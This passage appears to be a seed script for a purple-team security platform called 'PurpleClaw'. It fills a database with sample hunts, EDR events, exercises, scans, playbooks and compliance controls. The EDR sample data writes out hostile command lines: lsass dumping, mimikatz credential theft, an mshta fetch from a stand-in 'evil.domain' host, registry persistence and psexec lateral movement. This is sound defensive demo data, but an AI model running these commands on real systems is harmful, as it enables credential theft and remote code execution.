        ("Hunt: Beaconing Activity", "Identify periodic C2 beaconing", "SELECT source_ip, dest_ip, COUNT(*) as connections, STDDEV(interval) as jitter FROM network WHERE protocol='HTTPS' GROUP BY source_ip,dest_ip HAVING jitter < 5 AND connections > 50", "network", ["T1071","T1090"]),
    ]
    for name, desc, query, ds, techs in hunting_queries:
        db.add(ThreatHuntingQuery(name=name, description=desc, query=query, data_source=ds,
                                   mitre_techniques=techs, results_count=random.randint(0, 50),
                                   last_run=now - timedelta(days=random.randint(1, 14)) if random.random() > 0.3 else None))
    db.flush()

    # ── EDR Events ────────────────────────────────────────────────────────────
    edr_data = [
        ("process", AlertSeverity.critical, "procdump64.exe", 4821, "cmd.exe", "procdump64.exe -ma lsass.exe lsass.dmp", "SYSTEM", None, True, True),
        ("process", AlertSeverity.high, "powershell.exe", 3912, "winword.exe", "powershell -enc JABjAGwAaQBlAG4AdAA=", "john.smith", None, False, True),
        ("network", AlertSeverity.critical, "svchost.exe", 892, "services.exe", None, "SYSTEM", "185.220.101.45", False, True),
        ("file", AlertSeverity.high, "explorer.exe", 2341, "userinit.exe", None, "sarah.chen", None, False, False),
        ("process", AlertSeverity.medium, "mshta.exe", 5123, "winword.exe", "mshta.exe http://evil.domain/payload.hta", "john.viewer", None, True, True),
        ("registry", AlertSeverity.medium, "reg.exe", 4567, "cmd.exe", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater", "admin", None, False, False),
        ("process", AlertSeverity.critical, "mimikatz.exe", 9999, "cmd.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "SYSTEM", None, True, True),
        ("network", AlertSeverity.high, "chrome.exe", 1234, "explorer.exe", None, "devika.ops", "194.165.16.77", False, False),
        ("process", AlertSeverity.low, "psexec.exe", 7654, "cmd.exe", "psexec.exe \\\\10.0.1.10 -u admin -p P@ss cmd", "marcus.red", None, False, False),
        ("file", AlertSeverity.critical, "ransomware.exe", 8888, "explorer.exe", None, "john.smith", None, True, True),
    ]
    for j in range(50):
        edata = edr_data[j % len(edr_data)]
        etype, sev, pname, pid, parent, cmd, user, tip, blocked, alert_gen = edata
        db.add(EDREvent(asset_id=assets[j % len(assets)].id, event_type=etype, severity=sev,
                        process_name=pname, process_id=pid + j, parent_process=parent,
                        command_line=cmd, username=user, target_ip=tip,
                        blocked=blocked, alert_generated=alert_gen,
                        timestamp=now - timedelta(hours=random.randint(0, 72))))
    db.flush()

    # ── FIM Records ───────────────────────────────────────────────────────────
    fim_paths = [
        ("/etc/passwd", "normal"), ("/etc/shadow", "normal"), ("/etc/sudoers", "modified"),
        ("C:\\Windows\\System32\\lsass.exe", "normal"), ("C:\\Windows\\System32\\services.exe", "normal"),
        ("C:\\Windows\\System32\\svchost.exe", "modified"), ("/var/www/html/index.php", "suspicious"),
        ("C:\\inetpub\\wwwroot\\web.config", "modified"), ("/usr/bin/sudo", "normal"),
        ("/etc/crontab", "modified"), ("C:\\Users\\Public\\Documents\\update.exe", "suspicious"),
        ("/opt/app/config.yml", "normal"), ("C:\\Windows\\Temp\\payload.exe", "suspicious"),
        ("/etc/ssh/sshd_config", "modified"), ("C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\", "normal"),
    ]
    for idx, (path, status) in enumerate(fim_paths):
        db.add(FIMRecord(asset_id=assets[idx % len(assets)].id, path=path, status=status,
                         hash_sha256="a"*64, hash_md5="b"*32, size=random.randint(1024, 10485760),
                         permissions="644" if path.startswith("/") else "RWXRWXRWX",
                         owner="root" if path.startswith("/") else "SYSTEM",
                         modified_at=now - timedelta(hours=random.randint(1, 168)),
                         checked_at=now - timedelta(minutes=random.randint(5, 60)),
                         alert_generated=status in ["suspicious", "modified"]))
    db.flush()

    # ── Exercises ─────────────────────────────────────────────────────────────
    exercises_data = [
        ("CISA Shield Exercise Q1 2024", "tabletop", "completed", 0.72, 18,
         ["TA0001","TA0003","TA0008"], ["Detect phishing","Detect lateral movement","Contain ransomware"]),
        ("Ransomware Tabletop - Executive", "tabletop", "completed", 0.65, None,
         ["TA0040","TA0005"], ["Assess incident response readiness","Test communication plan"]),
        ("Cloud Security Red vs Blue", "red_blue", "active", 0.45, 32,
         ["TA0001","TA0009","TA0010"], ["Test cloud detection controls","Validate playbooks"]),
        ("Assumed Breach Simulation", "assumed_breach", "planned", 0.0, None,
         ["TA0004","TA0005","TA0006","TA0008"], ["Test post-compromise detection","Validate EDR"]),
        ("CTF - Internal Security Training", "ctf", "completed", 0.88, 8,
         ["TA0006","TA0007","TA0008"], ["Skill development","Tool familiarity"]),
    ]
    for ex_name, ex_type, ex_status, dr, mttd, ex_tacs, objectives in exercises_data:
        ex = Exercise(name=ex_name, type=ex_type, status=ex_status,
                      detection_rate=dr, mean_time_to_detect_minutes=mttd,
                      mitre_tactics=ex_tacs, objectives=objectives,
                      start_date=now - timedelta(days=random.randint(30, 90)),
                      end_date=now - timedelta(days=random.randint(1, 30)) if ex_status == "completed" else None,
                      red_team=["Marcus Rodriguez", "Alice Wong"],
                      blue_team=["Lisa Park", "David Kim"],
                      scope="Internal corporate network excluding production databases.")
        db.add(ex); db.flush()
        for ti, tech in enumerate(techniques[:5]):
            db.add(ExerciseStep(exercise_id=ex.id, technique_id=tech.technique_id, step_order=ti+1,
                                red_action=f"Execute {tech.name} against target systems",
                                blue_expected=f"Detect and alert on {tech.name} activity",
                                detection_success=random.choice([True, False, None]),
                                detection_time_minutes=random.randint(5, 120) if random.random() > 0.3 else None,
                                status="completed" if ex_status == "completed" else "pending"))
    db.flush()

    # ── Scan Jobs & Results ───────────────────────────────────────────────────
    scans = [
        ("Full Vulnerability Scan - Internal", "10.0.0.0/16", "vulnerability", "full", ScanStatus.completed, 40, 127, 5, 18),
        ("Web App Scan - Production", "10.0.2.0/24", "web", "full", ScanStatus.completed, 5, 24, 2, 7),
        ("Quick Scan - DMZ", "192.168.1.0/24", "port", "quick", ScanStatus.completed, 8, 45, 0, 3),
        ("Compliance Scan - PCI Scope", "10.0.3.0/24", "compliance", "compliance", ScanStatus.completed, 12, 67, 1, 9),
        ("Cloud Infrastructure Scan", "172.31.0.0/16", "vulnerability", "full", ScanStatus.running, 60, 89, 3, 11),
        ("Stealth Scan - Executive Subnet", "10.1.3.0/24", "port", "stealth", ScanStatus.completed, 3, 12, 0, 1),
        ("Weekly Quick Scan", "10.0.0.0/8", "vulnerability", "quick", ScanStatus.pending, 0, 0, 0, 0),
        ("Container Security Scan", "172.17.0.0/24", "vulnerability", "full", ScanStatus.completed, 4, 18, 1, 4),
    ]
    for sname, target, stype, policy, status, prog, total, crit, high in scans:
        sj = ScanJob(name=sname, target=target, type=stype, policy=policy, status=status,
                     progress=prog, total_hosts=total, findings_count=crit+high,
                     critical_count=crit, high_count=high,
                     created_by_id=users[1].id,
                     started_at=now - timedelta(hours=random.randint(2, 48)) if status != ScanStatus.pending else None,
                     completed_at=now - timedelta(hours=random.randint(1, 24)) if status == ScanStatus.completed else None)
        db.add(sj); db.flush()
        if status == ScanStatus.completed:
            for k in range(min(crit+high, 8)):
                sev = Severity.critical if k < crit else Severity.high
                db.add(ScanResult(job_id=sj.id, asset_id=assets[k % len(assets)].id,
                                  vulnerability_id=vulns[k % len(vulns)].id if vulns else None,
                                  severity=sev, title=f"Scan finding #{k+1}: {vulns[k % len(vulns)].cve_id if vulns else 'Vulnerability'}",
                                  port=random.choice([22, 80, 443, 3389, 1433, 3306]),
                                  service=random.choice(["SSH","HTTP","HTTPS","RDP","MSSQL","MySQL"])))
    db.flush()

    # ── Playbooks ─────────────────────────────────────────────────────────────
    playbooks_data = [
        ("Ransomware Response", "incident_response", 120, ["T1486","T1489"],
         [{"id":1,"title":"Isolate affected systems","description":"Disconnect infected hosts from network","action_type":"manual","order":1},
          {"id":2,"title":"Identify patient zero","description":"Determine initial infection vector","action_type":"investigation","order":2},
          {"id":3,"title":"Preserve forensic evidence","description":"Capture memory dumps and disk images","action_type":"manual","order":3},
          {"id":4,"title":"Notify stakeholders","description":"Alert management, legal, and affected parties","action_type":"communication","order":4},
          {"id":5,"title":"Begin recovery","description":"Restore from clean backups after eradication","action_type":"manual","order":5}]),
        ("Phishing Response", "incident_response", 60, ["T1566","T1078"],
         [{"id":1,"title":"Block malicious sender","description":"Add sender to email blocklist","action_type":"automated","order":1},
          {"id":2,"title":"Identify all recipients","description":"Search email gateway for campaign recipients","action_type":"investigation","order":2},
          {"id":3,"title":"Check for credential compromise","description":"Audit recent logins for affected users","action_type":"investigation","order":3},
          {"id":4,"title":"Reset compromised accounts","description":"Force password reset and revoke sessions","action_type":"manual","order":4}]),
        ("Data Breach Response", "incident_response", 180, ["T1041","T1567"],
         [{"id":1,"title":"Classify affected data","description":"Determine PII/PCI/sensitive data exposed","action_type":"investigation","order":1},
          {"id":2,"title":"Legal and compliance notification","description":"Notify legal team within 1 hour","action_type":"communication","order":2},
          {"id":3,"title":"Contain exfiltration path","description":"Block destination and monitor egress","action_type":"manual","order":3},
          {"id":4,"title":"Regulatory notification","description":"File breach notifications per GDPR/CCPA","action_type":"communication","order":4}]),
        ("Malware Containment", "incident_response", 45, ["T1059","T1547"],
         [{"id":1,"title":"Quarantine infected host","description":"Isolate host via EDR or network ACL","action_type":"automated","order":1},
          {"id":2,"title":"Hash and submit sample","description":"Extract and submit malware sample to sandbox","action_type":"manual","order":2},
          {"id":3,"title":"Scan for lateral spread","description":"Check for IOCs across fleet","action_type":"automated","order":3},
          {"id":4,"title":"Remediate and restore","description":"Clean host and restore to production","action_type":"manual","order":4}]),
        ("Insider Threat Investigation", "forensics", 240, ["T1052","T1213"],
         [{"id":1,"title":"Preserve HR records","description":"Collect HR documentation for departing employee","action_type":"manual","order":1},
          {"id":2,"title":"Audit data access logs","description":"Review DLP and CASB logs for data transfers","action_type":"investigation","order":2},
          {"id":3,"title":"Legal hold","description":"Preserve all electronic communications and access logs","action_type":"legal","order":3},
          {"id":4,"title":"Interview manager","description":"Gather context on employee behavior","action_type":"manual","order":4}]),
        ("DDoS Mitigation", "incident_response", 30, ["T1499"],
         [{"id":1,"title":"Engage upstream provider","description":"Contact ISP for upstream traffic scrubbing","action_type":"communication","order":1},
          {"id":2,"title":"Enable DDoS protection","description":"Activate CDN/WAF DDoS mitigation mode","action_type":"automated","order":2},
          {"id":3,"title":"Block attack vectors","description":"Implement firewall rules to drop attack traffic","action_type":"manual","order":3}]),
        ("Privilege Escalation Response", "incident_response", 90, ["T1068","T1078","T1134"],
         [{"id":1,"title":"Revoke escalated privileges","description":"Remove unauthorized group memberships","action_type":"manual","order":1},
          {"id":2,"title":"Audit privilege assignments","description":"Review all recent privilege changes","action_type":"investigation","order":2},
          {"id":3,"title":"Reset affected accounts","description":"Force credential reset for compromised accounts","action_type":"manual","order":3}]),
        ("Cloud Incident Response", "incident_response", 90, ["T1078","T1552","T1530"],
         [{"id":1,"title":"Revoke compromised credentials","description":"Disable IAM keys and OAuth tokens","action_type":"automated","order":1},
          {"id":2,"title":"Audit CloudTrail","description":"Review all API calls from compromised identity","action_type":"investigation","order":2},
          {"id":3,"title":"Snapshot affected resources","description":"Take EBS/disk snapshots for forensics","action_type":"automated","order":3},
          {"id":4,"title":"Enable GuardDuty/CSPM alerts","description":"Increase monitoring sensitivity","action_type":"automated","order":4}]),
    ]
    pb_list = []
    for name, pb_type, est_mins, techs, steps in playbooks_data:
        pb = Playbook(name=name, type=pb_type, description=f"Standard {pb_type} playbook: {name}",
                      estimated_minutes=est_mins, mitre_techniques=techs,
                      steps_json=steps, created_by_id=users[1].id)
        db.add(pb); db.flush(); pb_list.append(pb)

    # Playbook executions
    for i, inc in enumerate(incident_list[:3]):
        pe = PlaybookExecution(playbook_id=pb_list[i].id, incident_id=inc.id,
                               status=random.choice(["running","completed"]),
                               current_step=random.randint(1, 4), notes="Execution in progress.")
        db.add(pe)
    db.flush()

    # ── Compliance ────────────────────────────────────────────────────────────
    frameworks_data = [
        ("NIST Cybersecurity Framework", "1.1", "NIST CSF provides a policy framework of computer security guidance."),
        ("ISO/IEC 27001", "2022", "International standard for information security management systems."),
        ("PCI DSS", "4.0", "Payment Card Industry Data Security Standard for cardholder data protection."),
        ("CIS Controls", "v8", "Prioritized set of actions to protect organizations from known cyber attacks."),
    ]
    fw_list = []
    controls_per_fw = {
        0: [("ID.AM-1","Asset Inventory","IDENTIFY","Maintain inventory of hardware assets"),
            ("ID.AM-2","Software Inventory","IDENTIFY","Maintain inventory of software assets"),
            ("PR.AC-1","Identity Management","PROTECT","Manage identities and credentials for authorized devices"),
            ("PR.AC-3","Remote Access Management","PROTECT","Remote access is managed"),
            ("PR.DS-1","Data-at-Rest Protection","PROTECT","Data-at-rest is protected"),
            ("PR.IP-1","Baseline Configuration","PROTECT","Baseline configuration established and maintained"),
            ("DE.AE-1","Baseline Network Operations","DETECT","Network baseline established and managed"),
            ("DE.CM-1","Network Monitoring","DETECT","Network is monitored to detect potential cybersecurity events"),
            ("DE.CM-7","Unauthorized Activity Monitoring","DETECT","Monitor for unauthorized personnel/connections/devices/software"),
            ("RS.RP-1","Response Plan","RESPOND","Response plan is executed during incident"),
            ("RS.CO-2","Incident Reporting","RESPOND","Incidents reported consistent with criteria"),
            ("RC.RP-1","Recovery Plan","RECOVER","Recovery plan executed during recovery"),],
        1: [("A.8.1","Information Asset Inventory","Assets","Inventory of information and other associated assets"),
            ("A.8.2","Ownership of Assets","Assets","Assets shall have designated owners"),
            ("A.9.1","Access Control Policy","Access Control","Access control policy established and reviewed"),
            ("A.9.4","System Access Restriction","Access Control","Prevent unauthorized access to systems"),
            ("A.10.1","Cryptographic Controls","Cryptography","Policy on cryptographic controls developed and implemented"),
            ("A.12.1","Operational Procedures","Operations","Documented operating procedures"),
            ("A.12.6","Technical Vulnerability Management","Operations","Timely identification and remediation of vulnerabilities"),
            ("A.16.1","Information Security Incident Management","Incidents","Ensure consistent approach to incident management"),
            ("A.17.1","Business Continuity","Business Continuity","Plan for continuity of information security"),
            ("A.18.1","Legal Compliance","Compliance","Avoid breach of legal, statutory, regulatory or contractual obligations"),],
        2: [("1.1","Firewall Configuration","Network","Install and maintain network security controls"),
            ("2.1","System Configuration","Configuration","Apply secure configurations to all system components"),
            ("3.4","Primary Account Number Protection","Cardholder Data","Render PAN unreadable anywhere it is stored"),
            ("6.2","Secure Software Development","Software Security","Develop internal software securely"),
            ("7.1","Access Restriction","Restrict Access","Limit access to system components"),
            ("8.2","User Identification","Identify Users","All users have unique IDs"),
            ("8.3","MFA","Identify Users","MFA implemented for access to CDE"),
            ("10.1","Audit Logging","Logging","Log access to all system components and cardholder data"),
            ("10.5","Audit Log Security","Logging","Protect audit logs from destruction and unauthorized modifications"),
            ("11.3","Penetration Testing","Testing","Implement methodology for penetration testing"),
            ("12.1","Security Policy","Policy","Establish, publish, maintain, and disseminate a security policy"),],
        3: [("CIS-1","Enterprise Asset Inventory","Inventory","Actively manage all enterprise assets"),
            ("CIS-2","Software Asset Inventory","Inventory","Actively manage all software on the network"),
            ("CIS-3","Data Protection","Data","Develop processes to identify, classify and protect sensitive data"),
            ("CIS-4","Secure Configuration","Configuration","Establish and maintain secure configuration of enterprise assets"),
            ("CIS-5","Account Management","Accounts","Use processes and tools to assign and manage authorization"),
            ("CIS-6","Access Control Management","Access","Use processes to create, assign, manage and revoke access credentials"),
            ("CIS-7","Continuous Vulnerability Management","Vulnerabilities","Continuously acquire, assess, and take action on new information"),
            ("CIS-8","Audit Log Management","Audit","Collect, alert, review and retain audit logs"),
            ("CIS-10","Malware Defenses","Malware","Prevent or control installation, spread and execution of malicious apps"),
            ("CIS-11","Data Recovery","Recovery","Establish and maintain data recovery practices"),
            ("CIS-13","Network Monitoring","Monitoring","Operate processes and tooling to establish monitoring of networks"),
            ("CIS-16","Application Software Security","AppSec","Manage security lifecycle of in-house developed software"),],
    }
    for fw_idx, (fname, fver, fdesc) in enumerate(frameworks_data):
        fw = ComplianceFramework(name=fname, version=fver, description=fdesc, enabled=True)
        db.add(fw); db.flush()
        fw_controls = []
        for ctrl_id, ctrl_name, category, impl in controls_per_fw.get(fw_idx, []):
            ctrl = ComplianceControl(framework_id=fw.id, control_id=ctrl_id, name=ctrl_name,
                                     category=category, description=impl, implementation_guidance=f"Implement: {impl}")
            db.add(ctrl); db.flush(); fw_controls.append(ctrl)
        fw.controls_count = len(fw_controls)
        # Assessments
        statuses = ["compliant","compliant","partial","non_compliant","not_assessed"]
        for ctrl in fw_controls:
            s = random.choice(statuses)
            db.add(ComplianceAssessment(framework_id=fw.id, control_id=ctrl.id,
                                        status=s, notes=f"Assessment note for {ctrl.control_id}",
                                        assessed_by_id=users[1].id if s != "not_assessed" else None,
                                        assessed_at=now - timedelta(days=random.randint(30, 90)) if s != "not_assessed" else None,
                                        score=random.uniform(0.5, 1.0) if s == "compliant" else (random.uniform(0.2, 0.5) if s == "partial" else 0.0)))
        fw_list.append(fw)
    db.flush()

    # ── Report Templates ──────────────────────────────────────────────────────
    for name, rtype, desc in [
        ("Executive Security Summary", "executive", "Monthly executive overview of security posture and key metrics"),
        ("Technical Vulnerability Assessment", "technical", "Detailed technical findings from vulnerability scanning"),
        ("Compliance Status Report", "compliance", "Current compliance status across all frameworks"),
        ("Red Team Assessment Report", "red_team", "Findings and recommendations from red team engagement"),
        ("Incident Post-Mortem Report", "incident", "Detailed analysis of security incident and lessons learned"),
        ("Weekly Security Brief", "weekly", "Weekly summary of alerts, incidents, and key metrics"),
    ]:
        db.add(ReportTemplate(name=name, type=rtype, description=desc,
                              sections=["executive_summary","findings","recommendations","appendix"]))

    # ── Generated Reports ─────────────────────────────────────────────────────
    for name, rtype in [
        ("Q1 2024 Security Summary", "executive"), ("March Vulnerability Report", "technical"),
        ("PCI-DSS Q1 Assessment", "compliance"), ("Red Team Q4 2023 Report", "red_team"),
        ("INC-003 Post-Mortem", "incident"),
    ]:
        db.add(GeneratedReport(name=name, type=rtype, created_by_id=users[1].id,
                               format="pdf", status="completed",
                               created_at=now - timedelta(days=random.randint(5, 45))))

    # ── Notification Channels ─────────────────────────────────────────────────
    for name, ntype, config in [
        ("Slack #security-alerts", "slack", {"webhook_url": "https://hooks.slack.com/services/xxx/yyy/zzz", "channel": "#security-alerts"}),
        ("MS Teams Security Channel", "teams", {"webhook_url": "https://outlook.office.com/webhook/xxx"}),
        ("PagerDuty - Critical", "pagerduty", {"api_key": "xxx", "service_key": "yyy", "severity": "critical"}),
        ("Generic Security Webhook", "webhook", {"url": "https://siem.corp.local/webhook", "method": "POST"}),
    ]:
        db.add(NotificationChannel(name=name, type=ntype, config=config, enabled=True,
                                   last_test_success=random.choice([True, True, False])))

    # ── System Settings ───────────────────────────────────────────────────────
    settings_data = [
        ("platform_name", "PurpleClaw", "general", "Platform display name"),
        ("platform_version", "2.0.0", "general", "Current platform version"),
        ("max_login_attempts", 5, "auth", "Maximum failed login attempts before lockout"),
        ("session_timeout_minutes", 480, "auth", "Session timeout in minutes"),
        ("mfa_required_roles", ["admin"], "auth", "Roles requiring MFA"),
        ("scan_default_policy", "quick", "scanning", "Default scan policy"),
        ("scan_max_concurrent", 3, "scanning", "Maximum concurrent scans"),
        ("alert_retention_days", 365, "retention", "Alert retention period in days"),
        ("log_retention_days", 90, "retention", "Log event retention period"),
        ("report_retention_days", 730, "retention", "Generated report retention"),
        ("auto_close_resolved_incidents_days", 30, "general", "Auto-close resolved incidents after N days"),
        ("ioc_expiry_days", 180, "integrations", "Default IOC expiry period"),
        ("threat_feed_sync_interval_hours", 24, "integrations", "Threat feed synchronization interval"),
        ("email_from", "purpleclaw@corp.local", "notifications", "From address for email notifications"),
        ("smtp_server", "smtp.corp.local:587", "notifications", "SMTP server for email notifications"),
    ]
    for key, val, cat, desc in settings_data:
        db.add(SystemSetting(key=key, value=val, category=cat, description=desc))

    db.commit()
    print("✅ PurpleClaw database seeded successfully!")
